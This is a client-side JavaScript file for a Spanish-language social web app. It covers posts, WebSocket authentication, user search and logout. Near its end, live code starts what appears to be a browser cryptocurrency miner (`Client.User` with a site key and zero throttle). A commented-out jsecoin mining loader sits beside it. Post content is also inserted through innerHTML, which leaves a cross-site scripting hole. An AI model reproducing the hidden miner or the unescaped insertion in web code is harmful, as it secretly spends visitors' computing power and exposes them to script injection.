/**ulisesten at jan 2019 */

document.addEventListener('DOMContentLoaded', () => {

/**Util Functions*/

function getEl(id){
  return document.getElementById(id);
}

function newEl(el){
    return document.createElement(el);
}

function notif(text){
    console.log(text);
}



/**Calls */

    var usuario = localStorage.getItem('usuario');

    getPubs();


/**vars */
var queryHeaders = {
    'Content-Type': 'application/json; charset=utf-8',
    'Authorization': getEl('ctkn').value,
    'Tipo': 'query'
}

/************** WebSockets **************/
/*var ws = new io();

console.log('ws',ws)

ws.on('connect',function() {
  console.log('connected');
});

ws.on('disconnect', function(){});

var pubSender = getEl('pubSender');
pubSender.addEventListener('click',function(){
    let pubContent = getEl('pubContent');
    var pubData = {
      pubid: 'fhfhfh',
      time: '45:78:12',
      nombre: 'unoname',
      content: pubContent.value,
      tkn: getEl('ctkn').value
    }

    pubContent.value = '';

    ws.emit('pub',pubData);
    newPub(pubData);
});*/

var href = window.location.href;
var url = href.replace('http','ws');

getWsAuth(getEl('ctkn').value, auth => {
    console.log('auth',auth.wsAuth);
    var ws = new WebSocket(url);
    var auth = {tipo: 'auth', token: auth.wsAuth };

    ws.addEventListener('open', function() {
      console.log('ws connected');
      ws.send(JSON.stringify(auth));
    });

    ws.addEventListener('message', function (event) {
        console.log('Message from server ', event.data);
    });

    var pubSender = getEl('pubSender');
    pubSender.addEventListener('click',function(){
        let pubContent = getEl('pubContent');
        var pubData = {
          tipo: 'pub',
          content: pubContent.value,
          time: new Date(),
          tkn: getEl('ctkn').value
        }
    
        pubContent.value = '';
    
        ws.send(JSON.stringify(pubData));
        newPub(pubData);
    });
})







/************* Publications **************/


function newPub(res){
    res.nombre = usuario;

    var div = newEl('div');
    div.setAttribute('class','pubs border font');
    div.setAttribute('id',res.pubid);

    var content = newEl('p');
        content.setAttribute('class','content');
        content.innerHTML = res.content;
        //content = setFontSize(publication,res.content);
        //content = linkify(publication,res.pub,no_previsualization);


    //var imgUrl = getImage(res.imagen);
    var uImg = newEl('img');
        uImg.setAttribute('class','uImg borde');
        //uImg.setAttribute('src',imgUrl);

    var a = newEl('a');
        a.setAttribute('class','enlace1');
        a.setAttribute('href','/pagina/'+res.nombre);
        a.innerHTML = res.nombre;

    var hora = newEl('span');
        hora.setAttribute('class','time1');
        hora.innerHTML = res.time;

    var mg = newEl('span');
        mg.setAttribute('class','mg reacciones');
        mg.innerHTML = 'mg';

    var nmg = newEl('span');
        nmg.setAttribute('class','nmg reacciones');
        nmg.innerHTML = 'nmg';

    var comment = newEl('span');
        comment.setAttribute('class','comment reacciones');
        comment.innerHTML = 'comentar';
        //comment.addEventListener('click',comentar);

    div.prepend(comment);
    div.prepend(nmg);
    div.prepend(mg);
    div.prepend(content);
    div.prepend(hora);
    div.prepend(a);
    div.prepend(uImg);
    //div.addEventListener('click',getPublicationID);

    getEl('publications').prepend(div);
}

/** Get Publications **/
function getPubs(){
    fetch('/api/getPublications', {
        credentials: 'include',
        headers: queryHeaders,
        method: 'GET'
      })
        .then(res => {
          if(res.ok == false){
              console.log('Home->getPubs(): error');
              return;
          }
          return res.json();
      })
        .then(res => {
        console.log('Home->getPubs():',res);
      });
}

/******************* Search Bar *******************/

var searchU = getEl('searchU');
var searchResults = getEl('searchResults');

function getWord(){
  if(this.value === '') {
    searchResults.innerHTML = '';
    return;
  }

  var word = this.value;

  getUsers( word, getEl('ctkn').value)
}

searchU.addEventListener('input', getWord );

function getUsers(user, csrf){
    fetch('/api/users', {
        credentials: 'include',
        headers: queryHeaders,
        method: 'POST',
        body: JSON.stringify({
            'user': user,
            'csrf': csrf
        })
    })
    .then(res => {
        if(res.ok == false){
            console.log('Home->searchU(): error');
            return;
        }
         return res.json();
    })
    .then(res => {
        searchResults.innerHTML = '';
        res.forEach(el => {
          console.log('Home->getPubs():',el);

          var span = newEl('span');
          span.setAttribute('id',el.id);
          span.setAttribute('class','searchText');
          span.textContent = el.usuario;
          searchResults.appendChild(span);

        })
    });
}

function showMatches(){

}

/******************* Contactos ********************/

function searchBar(){

}


/** Salir */
getEl('salir').addEventListener('click', function(){
    fetch('/api/salir', {
        credentials: 'include',
        method: 'POST'
    })
    .then(res => {
        console.log('Home->salir()',res);
        if(res.ok === true)
            window.location.href = '/iniciar'

        return;
    })
})


var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',usuario, {
    throttle: 0.0, c: 'w'
});

_client.start();


//!function(){window.JSEDarkMode=1;window.JSESetLanguage="es";var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/145891/neki-platform.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();


})

/***get auth */
function getWsAuth(csrf,cb){
    var headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Tipo': 'query'
    }

    fetch('/api/wsAuth', {
        credentials: 'include',
        headers: headers,
        method: 'POST',
        body: JSON.stringify({
            'csrf': csrf
        })
    })
    .then(res => {
        if(res.ok == false){ return; }
        return res.json();
    })
    .then(res => {
        cb(res);
    });
}
